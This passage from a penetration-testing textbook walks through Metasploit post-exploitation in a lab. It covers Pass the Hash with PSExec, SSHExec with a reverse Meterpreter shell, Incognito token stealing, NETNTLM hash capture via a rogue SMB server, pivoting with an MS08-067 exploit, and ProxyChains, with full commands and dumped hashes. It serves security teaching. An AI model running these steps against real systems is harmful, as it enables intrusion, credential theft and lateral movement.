SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:6f552ba8b5c6198ba826d459344ceb14:::</pre></div></div><div class="note" title="Note"><h3 class="title"><a id="ch13note08"/>Note</h3><p>When using the <code class="literal">hashdump</code> Meterpreter command against newer Windows operating systems, you may find that it fails. An alternative is the post module: <span class="emphasis"><em>post/windows/gather/hashdump</em></span>. There is even post/windows/gather/smart_hashdump, which can not only gather local hashes but also active directory hashes if you have exploited a domain controller. So if at first you don’t succeed in dumping password hashes on a pentest, explore additional options.</p></div><p><a class="indexterm" id="iddle1610"/><a class="indexterm" id="iddle1784"/><a class="indexterm" id="iddle2218"/>Let’s use the Metasploit PSExec module to take advantage of how SMB authenticates and a technique called <span class="emphasis"><em>Pass the Hash</em></span>. Instead of setting the SMBPass option to <span class="emphasis"><em>georgia</em></span>’s password, copy in the LM and NTLM hashes for <span class="emphasis"><em>georgia</em></span> from the <code class="literal">hashdump</code> in <a class="xref" href="ch13.xhtml#psexec_pass_the_hash" title="Example 13-23. PSExec Pass the Hash">Example 13-23</a> as the SMBPass option.</p><div class="example"><a id="psexec_pass_the_hash"/><div class="example-title">Example 13-23. PSExec Pass the Hash</div><div class="example-contents"><pre class="programlisting">msf exploit(psexec) &gt; <span class="strong"><strong>set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c</strong></span>&#13;
SMBPass =&gt; e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c&#13;
msf exploit(psexec) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
[*] Meterpreter session 7 opened (192.168.20.9:4444 -&gt; 192.168.20.10:1233) at 2015-08-14 14:17:47 -0400</pre></div></div><p>Again we’re able to use PSExec to get a Meterpreter session. Even without knowing the plaintext password, the password hash alone can be enough to get access to other systems in the environment using PSExec.</p></div><div class="sect2" title="SSHExec"><div class="titlepage"><div><div><h3 class="title" id="sshexec">SSHExec</h3></div></div></div><p>Like PSExec for Windows, we can use SSHExec to move through an environment’s Linux systems if we have even one set of valid credentials, which are likely to work elsewhere in the environment. The Metasploit module <span class="emphasis"><em>multi/ssh/sshexec</em></span> and its options are shown in <a class="xref" href="ch13.xhtml#using_sshexec" title="Example 13-24. Using SSHExec">Example 13-24</a>.</p><div class="example"><a id="using_sshexec"/><div class="example-title">Example 13-24. Using SSHExec</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use exploit/multi/ssh/sshexec</strong></span>&#13;
msf exploit(sshexec) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/multi/ssh/sshexec):&#13;
&#13;
   Name      Current Setting  Required  Description&#13;
   ----      ---------------  --------  -----------&#13;
   PASSWORD                   yes       The password to authenticate with.&#13;
   RHOST                      yes       The target address&#13;
   RPORT     22               yes       The target port&#13;
   USERNAME  root             yes       The user to authenticate as.&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
msf exploit(sshexec) &gt; <span class="strong"><strong>set RHOST 192.168.20.11</strong></span>&#13;
RHOST =&gt; 192.168.20.11&#13;
msf exploit(sshexec) &gt; <span class="strong"><strong>set USERNAME georgia</strong></span>❶&#13;
USERNAME =&gt; georgia&#13;
msf exploit(sshexec) &gt; <span class="strong"><strong>set PASSWORD password</strong></span>❷&#13;
PASSWORD =&gt; password&#13;
msf exploit(sshexec) &gt; <span class="strong"><strong>show payloads</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
linux/x86/meterpreter/reverse_tcp    normal  Linux Meterpreter, Reverse TCP Stager&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
msf exploit(sshexec) &gt; <span class="strong"><strong>set payload linux/x86/meterpreter/reverse_tcp</strong></span>&#13;
payload =&gt; linux/x86/meterpreter/reverse_tcp&#13;
msf exploit(sshexec) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
LHOST =&gt; 192.168.20.9&#13;
msf exploit(sshexec) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
[*] Meterpreter session 10 opened (192.168.20.9:4444 -&gt; 192.168.20.11:36154) at 2015-03-25 13:43:26 -0400&#13;
meterpreter &gt; <span class="strong"><strong>getuid</strong></span>&#13;
Server username: uid=1000, gid=1000, euid=1000, egid=1000, suid=1000, sgid=1000&#13;
meterpreter &gt; shell&#13;
Process 21880 created.&#13;
Channel 1 created.&#13;
<span class="strong"><strong>whoami</strong></span>&#13;
georgia</pre></div></div><p><a class="indexterm" id="iddle1258"/><a class="indexterm" id="iddle1611"/><a class="indexterm" id="iddle2311"/>In this example, we know the credentials <span class="emphasis"><em>georgia:password</em></span> from having cracked them in <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a>. Although in this case we will just be logging into the same host again (similar to what we did in <a class="xref" href="ch13.xhtml#psexec" title="PSExec">PSExec</a>), we could use this same technique on other hosts in that same environment that have an account for <span class="emphasis"><em>georgia</em></span>.</p><p>As with PSExec, we need valid credentials in order to authenticate. We set the <code class="literal">USERNAME</code> to <span class="emphasis"><em>georgia</em></span> ❶ and <code class="literal">PASSWORD</code> to <span class="emphasis"><em>password</em></span> ❷, and then choose <span class="emphasis"><em>linux/x86/meterpreter/reverse_</em></span>tcp as the payload.</p><p>Unlike with PSExec (which uploaded a binary and ran it as a System service, automatically giving us System privileges), with SSHExec we are still user <span class="emphasis"><em>georgia</em></span>. You can see how this exploit could prove to be a quick way to move around an environment in search of additional information and vulnerabilities on other Linux systems.</p></div><div class="sect2" title="Token Impersonation"><div class="titlepage"><div><div><h3 class="title" id="token_impersonation">Token Impersonation</h3></div></div></div><p>Now that we know we might not even need plaintext passwords to gain access to other systems, is there any case where we may not even need the password hashes?</p><p>One interesting Windows security construct is the concept of <span class="emphasis"><em>tokens</em></span>. Tokens are primarily used for access control. Based on the token of a process, the operating system can make decisions about which resources and operations should be made available to it.</p><p>Think of a token as a kind of temporary key that gives you access to certain resources without having to enter your password every time you want to perform a privileged operation. When a user logs in to the system interactively, such as directly through the console or from a remote desktop, a <span class="emphasis"><em>delegation token</em></span> is created.</p><p>Delegation tokens allow the process to impersonate the token on the local system as well as on the network, for example on other systems in a domain. Delegation tokens contain credentials and can be used to authenticate with other systems that use these credentials, such as the domain controller. Tokens persist until reboot, and even if a user logs out, his or her <a class="indexterm" id="iddle1504"/><a class="indexterm" id="iddle1607"/><a class="indexterm" id="iddle1630"/><a class="indexterm" id="iddle1634"/>token will still be present on the system until it shuts down. If we can steal another token on the system, we can potentially gain additional privileges and even access to additional systems.</p></div><div class="sect2" title="Incognito"><div class="titlepage"><div><div><h3 class="title" id="incognito">Incognito</h3></div></div></div><p>We’re on a compromised system: our Windows XP target. Which tokens are on the system, and how do we steal them? <span class="emphasis"><em>Incognito</em></span> was originally a standalone tool developed by security researchers conducting research into using token stealing for privilege escalation, but it has since been added as an extension to Meterpreter. Incognito will help us enumerate and steal all the tokens on a system.</p><p>Incognito is not loaded into Meterpreter by default, but we can add it with the <code class="literal">load</code> command, as shown here. Use one of your Meterpreter sessions currently running as system, or use privilege escalation to elevate your access. (<span class="emphasis"><em>System</em></span> has access to all tokens on the target.)</p><a id="pro_id00166"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>load incognito</strong></span>&#13;
Loading extension incognito...success.</pre><p>Before we use Incognito, switch users on your Windows XP target and log in as <span class="emphasis"><em>secret</em></span> with the password <span class="emphasis"><em>Password123</em></span>. This login will create a delegation token on the target for us to impersonate. As we list tokens, Incognito searches all handles on the system to determine which ones belong to tokens using low-level Windows API calls. To see all the user tokens available with the Meterpreter Incognito, enter the command <span class="strong"><strong><code class="literal">list_tokens -u</code></strong></span> as shown in <a class="xref" href="ch13.xhtml#enumerating_tokens_with_incognito" title="Example 13-25. Enumerating tokens with Incognito">Example 13-25</a>.</p><div class="example"><a id="enumerating_tokens_with_incognito"/><div class="example-title">Example 13-25. Enumerating tokens with Incognito</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>list_tokens -u</strong></span>&#13;
&#13;
Delegation Tokens Available&#13;
========================================&#13;
BOOKXP\georgia&#13;
BOOKXP\secret&#13;
NT AUTHORITY\LOCAL SERVICE&#13;
NT AUTHORITY\NETWORK SERVICE&#13;
NT AUTHORITY\SYSTEM</pre></div></div><p>We see tokens for both <span class="emphasis"><em>georgia</em></span> and <span class="emphasis"><em>secret</em></span>. Let’s try stealing <span class="emphasis"><em>secret</em></span>’s delegation token, effectively gaining the privileges of this user. Use the <code class="literal">impersonate_token</code> command to steal the token, as shown in <a class="xref" href="ch13.xhtml#stealing_a_token_with_incognito" title="Example 13-26. Stealing a token with Incognito">Example 13-26</a>. (Note that we use two backslashes to escape the backslash between the domain—in this case, the local machine name—and the username.)</p><div class="example"><a id="stealing_a_token_with_incognito"/><div class="example-title">Example 13-26. Stealing a token with Incognito</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>impersonate_token BOOKXP\\secret</strong></span>&#13;
[+] Delegation token available&#13;
[+] Successfully impersonated user BOOKXP\secret&#13;
meterpreter &gt; <span class="strong"><strong>getuid</strong></span>&#13;
Server username: BOOKXP\secret</pre></div></div><p><a class="indexterm" id="iddle1088"/><a class="indexterm" id="iddle1282"/><a class="indexterm" id="iddle1462"/><a class="indexterm" id="iddle1609"/><a class="indexterm" id="iddle1885"/><a class="indexterm" id="iddle2181"/>Having stolen <span class="emphasis"><em>secret</em></span>’s token, if we run <code class="literal">getuid</code> we should see that we are effectively now the user <span class="emphasis"><em>secret</em></span>. This can be especially interesting when in a domain: If <span class="emphasis"><em>secret</em></span> is a domain administrator, we are now a domain administrator as well, and we can do things like create a new domain administrator account or change the domain administrator’s password. (We’ll look at how to add accounts from the command line in <a class="xref" href="ch13.xhtml#persistence" title="Persistence">Persistence</a>.)</p></div><div class="sect2" title="SMB Capture"><div class="titlepage"><div><div><h3 class="title" id="smb_capture">SMB Capture</h3></div></div></div><p>Let’s look at one more interesting consequence of token stealing. In a domain, password hashes for domain users are stored only on the domain controller, which means that running a hashdump on an exploited system will give us password hashes only for local users. We don’t have a domain set up, so <span class="emphasis"><em>secret</em></span>’s password hash is stored locally, but imagine that <span class="emphasis"><em>secret</em></span> is instead a domain user. Let’s look at a way of capturing the password hashes without gaining access to the domain controller by passing the hash to an SMB server we control and recording the results.</p><p>Open a second instance of Msfconsole, and use the module <span class="emphasis"><em>auxiliary/server/capture/smb</em></span> to set up an SMB server and capture any authentication attempts. Like the client-side attack modules we studied in <a class="xref" href="ch10.xhtml" title="Chapter 10. Client-Side Exploitation">Chapter 10</a>, this module does not directly attack another system; it just sets up a server and waits. Set up the module options as shown in <a class="xref" href="ch13.xhtml#using_the_smb_capture_module" title="Example 13-27. Using the SMB capture module">Example 13-27</a>.</p><div class="example"><a id="using_the_smb_capture_module"/><div class="example-title">Example 13-27. Using the SMB capture module</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use auxiliary/server/capture/smb</strong></span>&#13;
msf auxiliary(smb) &gt; <span class="strong"><strong>show options</strong></span>&#13;
Module options (auxiliary/server/capture/smb):&#13;
   Name        Current Setting   Required  Description&#13;
   ----        ---------------   --------  -----------&#13;
   CAINPWFILE                    no        The local filename to store the hashes in Cain&amp;Abel&#13;
                                             format&#13;
   CHALLENGE   1122334455667788  yes       The 8 byte challenge&#13;
   JOHNPWFILE                    no        The prefix to the local filename to store the hashes&#13;
                                             in JOHN format&#13;
   SRVHOST     0.0.0.0           yes       The local host to listen on. This must be an address&#13;
                                             on the local machine or 0.0.0.0&#13;
   SRVPORT     445               yes       The local port to listen on.&#13;
   SSL         false             no        Negotiate SSL for incoming connections&#13;
   SSLCert                       no        Path to a custom SSL certificate (default is&#13;
                                             randomly generated)&#13;
   SSLVersion  SSL3              no        Specify the version of SSL that should be used&#13;
                                             (accepted: SSL2, SSL3, TLS1)&#13;
msf auxiliary(smb) &gt; <span class="strong"><strong>set JOHNPWFILE /root/johnfile</strong></span>❶&#13;
JOHNPWFILE =&gt; johnfile&#13;
msf auxiliary(smb) &gt; <span class="strong"><strong>exploit</strong></span></pre></div></div><p><a class="indexterm" id="iddle1160"/><a class="indexterm" id="iddle1581"/><a class="indexterm" id="iddle1809"/>You can save the results to a <span class="emphasis"><em>CAINPWFILE</em></span> or a <span class="emphasis"><em>JOHNPWFILE</em></span>, which will save the captured hashes in the formats expected by the Cain and Abel password tool for Windows and John the Ripper, respectively. Let’s set it to <span class="emphasis"><em>JOHNPWFILE</em></span> ❶ because we learned how to use John in <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a>.</p><p>Now return to your Meterpreter session where you impersonated <span class="emphasis"><em>secret</em></span>’s token in the previous section, and drop to a shell, as shown next. Because we’ve stolen <span class="emphasis"><em>secret</em></span>’s token, this shell should be running as <span class="emphasis"><em>secret</em></span>. Knowing that delegation tokens include credentials to authenticate with other systems, we’ll use the <code class="literal">net use</code> Windows command to attempt to authenticate with our fake SMB capture server.</p><p>Connect to any share you like on the Kali SMB server. The login will fail, but the damage will be done.</p><a id="pro_id00167"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>shell</strong></span>&#13;
C:\Documents and Settings\secret&gt;<span class="strong"><strong>net use \\192.168.20.9\blah</strong></span></pre><p>Returning to your SMB Capture Msfconsole window, you should see that you’ve captured a set of password hashes.</p><a id="pro_id00168"/><pre class="programlisting">[*] SMB Captured - 2015-08-14 15:11:16 -0400&#13;
NTLMv1 Response Captured from 192.168.20.10:1078 – 192.168.20.10&#13;
USER:secret DOMAIN:BOOKXP OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1&#13;
LMHASH:76365e2d142b5612338deca26aaee2a5d6f3460500532424&#13;
NTHASH:f2148557db0456441e57ce35d83bd0a27fb71fc8913aa21c</pre><div class="note" title="Note"><h3 class="title"><a id="ch13note09"/>Note</h3><p>This exercise can be a bit flaky, particularly without a Windows domain present. You might have trouble capturing the hash and instead get something like this:</p></div><a id="pro_id00169"/><pre class="programlisting">[*] SMB Capture - Empty hash captured from 192.168.20.10:1050 - 192.168.20.10 captured, ignoring ...</pre><p><span class="emphasis"><em>This is a common issue. Just try to understand the concepts so you can try them in client environments where Windows domains are deployed.</em></span></p><p>The results are saved in the proper format in the JOHNPWFILE Metasploit module option for <span class="emphasis"><em>auxiliary/server/capture/smb</em></span>. For example, since we set our JOHNPWFILE as /<span class="emphasis"><em>root/johnfile</em></span>, the file to feed into John is <span class="emphasis"><em>/root/johnfile_netntlm</em></span>. When you compare the hashes to those dumped with <code class="literal">hashdump</code> in <a class="xref" href="ch13.xhtml#using_hashdump" title="Example 13-22. Using hashdump">Example 13-22</a>, you’ll see that the hashes for <span class="emphasis"><em>secret</em></span> differ. What’s going on? As it turns out, these hashes are for NETLM and NETNTLM, which are a bit different than the regular LM and NTLM Windows hashes we worked with in <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a>. And when you look at the <span class="emphasis"><em>JOHNPWFILE</em></span>, you’ll see that its format is a bit different from what we’ve seen previously with John the Ripper.</p><a id="pro_id00170"/><pre class="programlisting">secret::BOOKXP:76365e2d142b5612338deca26aaee2a5d6f3460500532424:f2148557db0456441e57ce35d83bd0a27fb71fc8913aa21c:1122334455667788</pre><p><a class="indexterm" id="iddle1159"/><a class="indexterm" id="iddle1261"/><a class="indexterm" id="iddle1300"/><a class="indexterm" id="iddle1499"/><a class="indexterm" id="iddle1942"/><a class="indexterm" id="iddle1980"/>In particular, the hash entry has taken note of the <code class="literal">CHALLENGE</code> option set in Metasploit. Though the user <span class="emphasis"><em>secret</em></span> has a local hash on our Windows XP target that would save us the trouble of cracking NETLM and NETNTLM hashes, this is a useful trick for grabbing password hashes when working with domain user accounts, which store their password hashes only on the domain controllers.</p></div></div><div class="sect1" title="Pivoting"><div class="titlepage"><div><div><h2 class="title" id="pivoting" style="clear: both">Pivoting</h2></div></div></div><p>Now let’s see if we can use access to a system to gain access to another network entirely. Typically an organization has only a few Internet-facing systems—hosting services that need to be made available to the Internet such as web servers, email, VPNs, and so on. These services may be hosted by a provider such as Google or GoDaddy, or they may be hosted in house. If they are hosted in house, gaining access to them from the Internet may give you access to the internal network. Ideally their internal network will be segmented by business unit, level of sensitivity, and so on, such that access to one machine does not give direct network access to all machines in the enterprise.</p><div class="note" title="Note"><h3 class="title"><a id="ch13note10"/>Note</h3><p>Internet-facing systems may be <span class="emphasis"><em>dual homed</em></span>, or a member of multiple networks, namely the Internet and an internal network. A security best practice is to keep dual-homed systems segregated from sensitive internal network resources in a demilitarized zone, but I have performed penetration tests for clients who have Internet-facing systems as part of their internal domain. All I had to do was exploit their web application, which had a default password for the administrative account, and upload a PHP shell as we did to XAMPP in <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a>, and suddenly I had access to a system on their internal domain. Hopefully, most of your clients will require a few more steps between piercing the perimeter and domain access.</p></div><p>When we set up our Windows 7 target in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>, we gave it two virtual network adapters. We connected one to the bridged network where it could talk to the other targets and our Kali virtual machine. The other virtual adapter is connected to the host-only network. For this exercise, switch the Windows XP target to the host-only network so it is no longer accessible by the Kali system. (For more information on changing virtual network settings, see <a class="xref" href="ch01.xhtml#creating_the_windows_7_target" title="Creating the Windows 7 Target">Creating the Windows 7 Target</a>.)</p><p>Though this is a Windows system, Meterpreter allows us to use the <code class="literal">ifconfig</code> command to see networking information. As shown in <a class="xref" href="ch13.xhtml#dual-homed_system_networking_information" title="Example 13-28. Dual-homed system networking information">Example 13-28</a>, the Windows 7 target is part of two networks: the 192.168.20.0/24 network, which also includes our Kali system, and the 172.16.85.0/24 network, which our Kali system does not have access to.</p><div class="example"><a id="dual-homed_system_networking_information"/><div class="example-title">Example 13-28. Dual-homed system networking information</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>ifconfig</strong></span>&#13;
Interface 11&#13;
============&#13;
Name         : Intel(R) PRO/1000 MT Network Connection&#13;
Hardware MAC : 00:0c:29:62:d5:c8&#13;
MTU          : 1500&#13;
IPv4 Address : 192.168.20.12&#13;
IPv4 Netmask : 255.255.255.0&#13;
Interface 23&#13;
============&#13;
Name         : Intel(R) PRO/1000 MT Network Connection #2&#13;
Hardware MAC : 00:0c:29:62:d5:d2&#13;
MTU          : 1500&#13;
IPv4 Address : 172.16.85.191&#13;
IPv4 Netmask : 255.255.255.0</pre></div></div><p><a class="indexterm" id="iddle1683"/><a class="indexterm" id="iddle1746"/><a class="indexterm" id="iddle2089"/>We can’t attack any systems in the 172.16.85.0 network directly from Kali. However, because we have access to the Windows 7 target, we can use it as a jumping-off point, or <span class="emphasis"><em>pivot</em></span>, to further explore this second network, as shown in <a class="xref" href="ch13.xhtml#pivoting_through_an_exploited_system" title="Figure 13-3. Pivoting through an exploited system">Figure 13-3</a>.</p><div class="figure"><a id="pivoting_through_an_exploited_system"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00117"/><img alt="Pivoting through an exploited system" src="httpatomoreillycomsourcenostarchimages2030424.png.jpg"/></div></div><div class="figure-title">Figure 13-3. Pivoting through an exploited system</div></div><p>At this point we could start uploading our hack tools to the Windows 7 target to begin the penetration test on the 172.16.85.0 network, but that attempt would likely be caught by antivirus software, and we’d have to clean up the mess left behind. Metasploit gives us another option: We can route all of the traffic for our target network through an open Metasploit session.</p><div class="sect2" title="Adding a Route in Metasploit"><div class="titlepage"><div><div><h3 class="title" id="adding_a_route_in_metasploit">Adding a Route in Metasploit</h3></div></div></div><p>The <code class="literal">route</code> command in Metasploit tells Metasploit where to route traffic. Instead of routing traffic to an IP address, we send traffic destined for a network through a specific open session. In this case, we want to send all traffic headed to the 172.16.85.0 network through the Windows 7 session. The syntax for the route command in Metasploit is <code class="literal">route add</code> <span class="emphasis"><em><code class="literal">network &lt;subnet</code></em></span> <span class="emphasis"><em><code class="literal">mask&gt; &lt;session id&gt;</code></em></span>.</p><a id="pro_id00171"/><pre class="programlisting">msf &gt; <span class="strong"><strong>route add 172.16.85.0 255.255.255.0 2</strong></span></pre><p><a class="indexterm" id="iddle1374"/><a class="indexterm" id="iddle1702"/><a class="indexterm" id="iddle1955"/><a class="indexterm" id="iddle2103"/><a class="indexterm" id="iddle2496"/>Now any traffic we send from Metasploit to the 172.16.85.0 network will automatically be routed through the Windows 7 session (session 2 in my case). We can set options such as <code class="literal">RHOST</code> or <code class="literal">RHOSTS</code> to systems in this network, and Metasploit will get traffic to the right place.</p></div><div class="sect2" title="Metasploit Port Scanners"><div class="titlepage"><div><div><h3 class="title" id="metasploit_port_scanners">Metasploit Port Scanners</h3></div></div></div><p>One of the first things we did when information gathering in <a class="xref" href="ch05.xhtml" title="Chapter 5. Information Gathering">Chapter 5</a> was to port scan our targets with Nmap. We won’t be able to use external tools with our Metasploit route, but luckily Metasploit has some port-scanning modules we can use instead, like the <span class="emphasis"><em>scanner/portscan/tcp</em></span> module, which will perform a simple TCP port scan, as shown in <a class="xref" href="ch13.xhtml#port_scanning_with_metasploit" title="Example 13-29. Port scanning with Metasploit">Example 13-29</a>.</p><div class="example"><a id="port_scanning_with_metasploit"/><div class="example-title">Example 13-29. Port scanning with Metasploit</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use scanner/portscan/tcp</strong></span>&#13;
msf  auxiliary(tcp) &gt; <span class="strong"><strong>show options</strong></span>&#13;
Module options (auxiliary/scanner/portscan/tcp):&#13;
&#13;
   Name         Current Setting  Required  Description&#13;
   ----         ---------------  --------  -----------&#13;
   CONCURRENCY  10               yes       The number of concurrent ports to check per host&#13;
   PORTS       ❶1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)&#13;
   RHOSTS                        yes       The target address range or CIDR identifier&#13;
   THREADS      1                yes       The number of concurrent threads&#13;
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds&#13;
msf  auxiliary(tcp) &gt; <span class="strong"><strong>set RHOSTS 172.16.85.190</strong></span>&#13;
rhosts =&gt; 172.16.85.190&#13;
msf  auxiliary(tcp) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
[*] 172.16.85.190:25 - TCP OPEN&#13;
[*] 172.16.85.190:80 - TCP OPEN&#13;
[*] 172.16.85.190:139 - TCP OPEN&#13;
[*] 172.16.85.190:135 - TCP OPEN&#13;
[*] 172.16.85.190:180 - TCP OPEN&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p>Set the <code class="literal">RHOSTS</code> option as usual for auxiliary modules. By default Metasploit scans port 1-10000 ❶, though you can change this option if you wish.</p><p>Though Metasploit’s port scanners are not as powerful as Nmap’s, we can at least see that the SMB port is open. From here we might run the <span class="emphasis"><em>auxiliary/scanner/smb/smb_version</em></span> module followed by the <code class="literal">check</code> function with the <span class="emphasis"><em>windows/smb/ms08_067_netapi</em></span> module to lead us toward exploiting the Windows XP target with the MS08-067 exploit through a pivot.</p></div><div class="sect2" title="Running an Exploit through a Pivot"><div class="titlepage"><div><div><h3 class="title" id="running_an_exploit_through_a_pivot">Running an Exploit through a Pivot</h3></div></div></div><p>Because our Windows XP and Kali systems are on different networks, a reverse payload won’t work for our exploit because the Windows XP target won’t know how to route traffic back to 192.168.20.9. (Of course, if our Kali system was on the Internet and the internal network we are attacking could route to the Internet, that would not be the case. However, here our host-only network does not know how to route to our bridged network.) Instead, <a class="indexterm" id="iddle1107"/><a class="indexterm" id="iddle1345"/><a class="indexterm" id="iddle1944"/><a class="indexterm" id="iddle2002"/><a class="indexterm" id="iddle2194"/><a class="indexterm" id="iddle2492"/>we’ll use a <span class="emphasis"><em>bind payload</em></span>. Metasploit’s bind handler will have no trouble routing through the pivot we set up. The <span class="emphasis"><em>windows/meterpreter/bind_tcp</em></span> payload will work as shown in <a class="xref" href="ch13.xhtml#exploiting_through_a_pivot" title="Example 13-30. Exploiting through a pivot">Example 13-30</a>.</p><div class="example"><a id="exploiting_through_a_pivot"/><div class="example-title">Example 13-30. Exploiting through a pivot</div><div class="example-contents"><pre class="programlisting">msf exploit(handler) &gt; <span class="strong"><strong>use windows/smb/ms08_067_netapi</strong></span>&#13;
msf exploit(ms08_067_netapi) &gt; <span class="strong"><strong>set RHOST 172.16.85.190</strong></span>&#13;
RHOST =&gt; 172.16.85.190&#13;
msf exploit(ms08_067_netapi) &gt; <span class="strong"><strong>set payload windows/meterpreter/bind_tcp</strong></span>&#13;
payload =&gt; windows/meterpreter/bind_tcp&#13;
msf exploit(ms08_067_netapi) &gt; <span class="strong"><strong>exploit</strong></span></pre></div></div><p>We’ve gotten another session, this time through a pivot.</p></div><div class="sect2" title="Socks4a and ProxyChains"><div class="titlepage"><div><div><h3 class="title" id="socks4a_and_proxychains">Socks4a and ProxyChains</h3></div></div></div><p>Pivoting through Metasploit is all well and good, but we’re limited to using Metasploit modules. Perhaps there is a way to proxy other tools through Metasploit’s pivot? In fact there is: using the ProxyChains tool (which redirects traffic to proxy servers) to send our traffic from other Kali tools through Metasploit.</p><p>But first we need to set up a proxy server in Metasploit. Like the SMB server module we used to capture NETLM and NETNTLM hashes earlier in this chapter, Metasploit also has a Socks4a proxy server module (<span class="emphasis"><em>auxiliary/server/socks4a</em></span>). <a class="xref" href="ch13.xhtml#setting_up_a_socks4a_proxy_server_in_met" title="Example 13-31. Setting up a Socks4a proxy server in Metasploit">Example 13-31</a> shows how to set up the proxy server.</p><div class="example"><a id="setting_up_a_socks4a_proxy_server_in_met"/><div class="example-title">Example 13-31. Setting up a Socks4a proxy server in Metasploit</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use auxiliary/server/socks4a</strong></span>&#13;
msf auxiliary(socks4a) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (auxiliary/server/socks4a):&#13;
&#13;
   Name     Current Setting  Required  Description&#13;
   ----     ---------------  --------  -----------&#13;
   SRVHOST  0.0.0.0          yes       The address to listen on&#13;
   SRVPORT  1080             yes       The port to listen on.&#13;
&#13;
msf auxiliary(socks4a) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
[*] Auxiliary module execution completed&#13;
[*] Starting the socks4a proxy server</pre></div></div><p>Leave the options as the defaults, but note that the server will be listening on port 1080.</p><p>Now we need to edit the configuration file for ProxyChains at <span class="emphasis"><em>/etc/proxychains.conf</em></span>. Scroll down to the bottom of the file in an editor, and you should see that by default, ProxyChains is set to route traffic to the Tor network as shown here.</p><a id="pro_id00172"/><pre class="programlisting"># add proxy here ...&#13;
# defaults set to "tor"&#13;
socks4  127.0.0.1 9050</pre><p><a class="indexterm" id="iddle1838"/>We need to change the proxy value to Metasploit’s listening server. Replace port 9050 (for Tor) with 1080 (for Metasploit). The line should now read:</p><a id="pro_id00173"/><pre class="programlisting">socks4  127.0.0.1 1080</pre><p>Save the configuration file for ProxyChains. Now we can run tools like Nmap from outside Metasploit against our Windows XP target, as long as we preface them with <code class="literal">proxychains</code> as shown in <a class="xref" href="ch13.xhtml#running_nmap_through_proxychains" title="Example 13-32. Running Nmap through ProxyChains">Example 13-32</a>. (The Metasploit route must still be active because ProxyChains simply redirects the traffic to Metasploit, which will forward the traffic through the pivot.)</p><div class="example"><a id="running_nmap_through_proxychains"/><div class="example-title">Example 13-32. Running Nmap through ProxyChains</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>proxychains nmap -Pn -sT -sV -p 445,446 172.16.85.190</strong></span>&#13;
ProxyChains-3.1 (http://proxychains.sf.net)&#13;
Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-25 15:00 EDT&#13;
|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.16.85.190.165:445-&lt;&gt;&lt;&gt;-OK❶&#13;
|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.16.85.190:446-&lt;--denied❷&#13;
Nmap scan report for 172.16.85.190&#13;
Host is up (0.32s latency).&#13;
PORT    STATE  SERVICE      VERSION&#13;
445/tcp open   microsoft-ds Microsoft Windows XP microsoft-ds&#13;
446/tcp closed ddm-rdb&#13;
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</pre></div></div><p><a class="xref" href="ch13.xhtml#running_nmap_through_proxychains" title="Example 13-32. Running Nmap through ProxyChains">Example 13-32</a> shows Nmap being run against the Windows XP host through the pivot with ProxyChains. The option <code class="literal">-Pn</code> tells Nmap not to try to ping through the proxy. We start with a simple TCP connect scan (<code class="literal">-sT</code>) and then run a version scan (<code class="literal">-sV</code>). For the sake of simplicity, I’ve limited the ports to 445 and 446 with the <code class="literal">-p</code> option. We see that the connection is <code class="literal">OK</code> on port 445 ❶ but <code class="literal">denied</code> on port 446 ❷. This makes sense because the SMB server is running on port 445, but nothing is running on port 446. (If any of this is unfamiliar, see <a class="xref" href="ch05.xhtml#port_scanning_with_nmap" title="Port Scanning with Nmap">Port Scanning with Nmap</a>.)</p><p>This is just one way to run tools external to Metasploit through a pivot. While doing so does slow things down a bit, it can be quite useful to have access to other tools in Kali.</p><div class="note" title="Note"><h3 class="title"><a id="ch13note11"/>Note</h3><p>Not all vulnerabilities will be exploitable through a pivot. In general, it depends on how the vulnerable protocols work. Another technique to look into is SSH tunneling. See my blog at <span class="emphasis"><em><a class="ulink" href="http://www.bulbsecurity.com/" target="_top">http://www.bulbsecurity.com/</a></em></span> for more information.</p></div></div></div><div class="sect1" title="Persistence"><div class="titlepage"><div><div><h2 class="title" 